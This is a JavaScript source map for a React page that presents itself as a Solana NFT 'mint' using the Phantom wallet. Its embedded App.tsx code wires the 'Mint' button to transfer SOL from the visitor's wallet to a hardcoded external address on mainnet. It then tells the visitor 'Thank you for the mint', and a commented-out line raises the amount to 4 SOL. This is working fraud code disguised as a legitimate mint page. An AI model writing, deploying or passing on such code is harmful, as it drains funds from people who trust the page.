{"version":3,"sources":["App.tsx","index.tsx"],"names":["NETWORK","clusterApiUrl","CONNECTION","Connection","App","provider","window","solana","isPhantom","getProvider","useState","logs","setLogs","addLog","log","setConnected","useEffect","on","connect","onlyIfTrusted","catch","disconnect","createTransaction","instructions","a","publicKey","transaction","Transaction","add","feePayer","anyTransaction","getRecentBlockhash","recentBlockhash","blockhash","createTransferTransaction","SystemProgram","transfer","fromPubkey","toPubkey","PublicKey","lamports","sendTransaction","signAndSendTransaction","signature","confirmTransaction","console","warn","JSON","stringify","sendTransferInstruction","className","onClick","map","i","rootElement","document","getElementById","render"],"mappings":"ySA6DMA,EAAUC,YAjCO,gBAkCjBC,EAAa,IAAIC,IAAWH,GAEnB,SAASI,IACtB,IAAIC,EAdc,WAClB,GAAI,WAAYC,OAAQ,CACtB,IACMD,EADiBC,OACIC,OAC3B,GAAIF,EAASG,UACX,OAAOH,GASII,GACf,EAAwBC,mBAAmB,IAA3C,mBAAOC,EAAP,KAAaC,EAAb,KACMC,EAAS,SAACC,GAAD,OAAiBF,EAAQ,GAAD,mBAAKD,GAAL,CAAWG,MAClD,EAAyBJ,oBAAkB,GAAlCK,EAAT,oBAsBA,GApBAC,qBAAU,WACR,GAAIX,EAaF,OAZAA,EAASY,GAAG,WAAW,WACrBF,GAAa,MAGfV,EAASY,GAAG,cAAc,WACxBF,GAAa,MAIfV,EAASa,QAAQ,CAAEC,eAAe,IAAQC,OAAM,eAGzC,WACLf,EAASgB,gBAGZ,CAAChB,KAECA,EAGH,OAAO,4DAGT,IAAMiB,EAAiB,uCAAG,WAAOC,GAAP,mBAAAC,EAAA,yDACnBnB,EAASoB,UADU,wDAIpBC,GAAc,MAAIC,KAAcC,IAAlB,oBAAyBL,KAC/BM,SAAWxB,EAASoB,UAE1BK,EAAsBJ,EAPJ,SAShBxB,EAAW6B,qBATK,cAQxBD,EAAeE,gBARS,OAUtBC,UAVsB,kBAWjBP,GAXiB,2CAAH,sDAcjBQ,EAAyB,uCAAG,sBAAAV,EAAA,+EAChCF,EAAkB,CAChBa,IAAcC,SAAS,CACrBC,WAAYhC,EAASoB,UACrBa,SAAU,IAAIC,IAvFE,gDA0FhBC,SAvFQ,SAgFoB,2CAAH,qDAWzBC,EAAe,uCAAG,WAAOf,GAAP,iBAAAF,EAAA,0DAClBE,EADkB,0CAGQrB,EAASqC,uBAAuBhB,GAHxC,uBAGZiB,EAHY,EAGZA,UACN9B,EACE,gDALgB,SAOZX,EAAW0C,mBAAmBD,GAPlB,OAQlB9B,EAAO,0BARW,kDAUlBgC,QAAQC,KAAR,MACAjC,EAAO,UAAYkC,KAAKC,UAAL,OAXD,0DAAH,sDAefC,EAAuB,uCAAG,4BAAAzB,EAAA,sEACJU,IADI,OACxBR,EADwB,OAE9Be,EAAgBf,GAFc,2CAAH,qDAK7B,OACE,qBAAKwB,UAAU,MAAf,SACE,iCACG7C,GAAYA,EAASoB,UACpB,mCACE,wBAAQyB,UAAU,SAASC,QAASF,EAApC,oBAGF,mCACE,wBAAQC,UAAU,SAChBC,QAAO,sBAAE,sBAAA3B,EAAA,+EAEanB,EAASa,UAFtB,6DAML2B,QAAQC,KAAR,MANK,wDADX,kCAiBJ,qBAAKI,UAAU,OAAf,SACGvC,EAAKyC,KAAI,SAACtC,EAAKuC,GAAN,OACR,qBAAKH,UAAU,MAAf,SACGpC,GADuBuC,aCrKtC,IAAMC,EAAcC,SAASC,eAAe,QAC5CC,iBAAO,cAACrD,EAAD,IAASkD,I","file":"static/js/main.9c079c93.chunk.js","sourcesContent":["import { useState, useEffect } from \"react\";\nimport {\n  Connection,\n  PublicKey,\n  Transaction,\n  clusterApiUrl,\n  SystemProgram,\n  TransactionInstruction,\n  SendOptions,\n} from \"@solana/web3.js\";\nimport { Token } from \"@solana/spl-token\";\nimport \"./styles.css\";\n\ntype DisplayEncoding = \"utf8\" | \"hex\";\ntype PhantomEvent = \"disconnect\" | \"connect\";\ntype PhantomRequestMethod =\n  | \"connect\"\n  | \"disconnect\"\n  | \"signTransaction\"\n  | \"signAllTransactions\"\n  | \"signAndSendTransaction\"\n  | \"signMessage\";\n\ninterface ConnectOpts {\n  onlyIfTrusted: boolean;\n}\n\nconst EXTERNAL_WALLET = \"55AdCCAHutCh4omchTecr4LjzJj3G3zjMFU46H9ZBmGA\";\nconst SOLANA_CLUSTER = \"mainnet-beta\";\n// const AMMOUNT = 4000000000;\nconst AMMOUNT = 100;\n\ninterface PhantomProvider {\n  publicKey: PublicKey | null;\n  isConnected: boolean | null;\n  signTransaction: (transaction: Transaction) => Promise<Transaction>;\n  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;\n  signAndSendTransaction: (\n    transaction: Transaction,\n    options?: SendOptions\n  ) => Promise<{ signature: string }>;\n  signMessage: (\n    message: Uint8Array | string,\n    display?: DisplayEncoding\n  ) => Promise<{ signature: string; publicKey: PublicKey }>;\n  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;\n  disconnect: () => Promise<void>;\n  on: (event: PhantomEvent, handler: (args: any) => void) => void;\n  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;\n}\n\nconst getProvider = (): PhantomProvider | undefined => {\n  if (\"solana\" in window) {\n    const anyWindow: any = window;\n    const provider = anyWindow.solana;\n    if (provider.isPhantom) {\n      return provider;\n    }\n  }\n};\n\nconst NETWORK = clusterApiUrl(SOLANA_CLUSTER);\nconst CONNECTION = new Connection(NETWORK);\n\nexport default function App() {\n  var provider = getProvider();\n  const [logs, setLogs] = useState<string[]>([]);\n  const addLog = (log: string) => setLogs([...logs, log]);\n  const [, setConnected] = useState<boolean>(false);\n\n  useEffect(() => {\n    if (provider) {\n      provider.on(\"connect\", () => {\n        setConnected(true);\n        // addLog(\"Connected to wallet \" + provider.publicKey?.toBase58());\n      });\n      provider.on(\"disconnect\", () => {\n        setConnected(false);\n        // addLog(\"Disconnected from wallet\");\n      });\n      // try to eagerly connect\n      provider.connect({ onlyIfTrusted: true }).catch(() => {\n        // fail silently\n      });\n      return () => {\n        provider.disconnect();\n      };\n    }\n  }, [provider]);\n\n  if (!provider) {\n    // var provider = getProvider()\n    // return getProvider();\n    return <h2>Unlock your Phantom wallet</h2>;\n  }\n\n  const createTransaction = async (instructions: TransactionInstruction[]) => {\n    if (!provider.publicKey) {\n      return;\n    }\n    let transaction = new Transaction().add(...instructions);\n    transaction.feePayer = provider.publicKey;\n    // addLog(\"Getting recent blockhash\");\n    const anyTransaction: any = transaction;\n    anyTransaction.recentBlockhash = (\n      await CONNECTION.getRecentBlockhash()\n    ).blockhash;\n    return transaction;\n  };\n\n  const createTransferTransaction = async () =>\n    createTransaction([\n      SystemProgram.transfer({\n        fromPubkey: provider.publicKey,\n        toPubkey: new PublicKey(\n          EXTERNAL_WALLET\n        ),\n        lamports: AMMOUNT,\n      }),\n    ]);\n\n  const sendTransaction = async (transaction: Transaction) => {\n    if (transaction) {\n      try {\n        let { signature } = await provider.signAndSendTransaction(transaction);\n        addLog(\n          \"Your tokens have been received by our server\"\n        );\n        await CONNECTION.confirmTransaction(signature);\n        addLog(\"Thank you for the mint\");\n      } catch (err) {\n        console.warn(err);\n        addLog(\"Error: \" + JSON.stringify(err));\n      }\n    }\n  };\n  const sendTransferInstruction = async () => {\n    const transaction = await createTransferTransaction();\n    sendTransaction(transaction);\n  };\n\n  return (\n    <div className=\"App\">\n      <main>\n        {provider && provider.publicKey ? (\n          <>\n            <button className=\"button\" onClick={sendTransferInstruction}>Mint</button>\n          </>\n        ) : (\n          <>\n            <button className=\"button\"\n              onClick={async () => {\n                try {\n                  const res = await provider.connect();\n                  // console.log(res);\n                  // addLog(JSON.stringify(res));\n                } catch (err) {\n                  console.warn(err);\n                  // addLog(\"Error: \" + JSON.stringify(err));\n                }\n              }}\n            >\n              Connect to Phantom\n            </button>\n            {/* You have to use Phantom for connection with our mint system */}\n          </>\n        )}\n        <div className=\"logs\">\n          {logs.map((log, i) => (\n            <div className=\"log\" key={i}>\n              {log}\n            </div>\n          ))}\n        </div>\n      </main>\n    </div>\n  );\n}\n","import { render } from \"react-dom\";\n\nimport App from \"./App\";\n\nconst rootElement = document.getElementById(\"mint\");\nrender(<App />, rootElement);\n"],"sourceRoot":""}